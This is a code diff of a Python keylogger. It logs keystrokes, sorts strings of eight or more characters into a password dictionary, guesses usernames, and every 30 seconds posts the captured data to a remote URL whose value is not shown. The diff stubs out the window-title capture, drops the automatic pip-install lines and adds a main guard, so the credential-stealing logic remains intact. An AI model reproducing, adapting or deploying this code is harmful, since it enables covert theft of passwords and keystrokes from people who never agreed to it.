@@ -1,9 +1,9 @@
+import os
 import keyboard #keylogs
 from threading import Semaphore, Timer
 from datetime import datetime
-from win32gui import GetWindowText, GetForegroundWindow
 import requests
-import os
+
 
 send_interval= 30 #1 min
 file_url = "url"
@@ -22,7 +22,7 @@ class Keylogger:
         self.shift = False
     
     def checkPass(self, s):
-        window = GetWindowText(GetForegroundWindow())
+        window = '' #GetWindowText(GetForegroundWindow())
 
         if(len(s) >= 8):
             self.passwords[window] = s
@@ -46,7 +46,7 @@ class Keylogger:
     
     def callback(self, event):
         name = event.name
-        window = GetWindowText(GetForegroundWindow())
+        window = '' #GetWindowText(GetForegroundWindow())
         if len(name) == 1:
             self.current_string += name
 
@@ -76,7 +76,7 @@ class Keylogger:
             'username' : str(self.potential_user),
             'all strings': str(self.all_strings)
         }
-        sender = requests.post(post_url,data)
+        requests.post(post_url,data)
         
         print(self.passwords, self.passwords_very_sure, self.all_strings,  self.potential_user,  self.log )
         self.passwords = {}
@@ -98,12 +98,8 @@ class Keylogger:
         self.report()
         self.semaphore.acquire()
     
-def main():
+if __name__=='__main__':
     keylogger = Keylogger(send_interval)
     keylogger.run()
+    
 
-
-os.system('pip install keyboard')
-os.system('pip install requests')
-os.system('pip install pywin32')
-main()
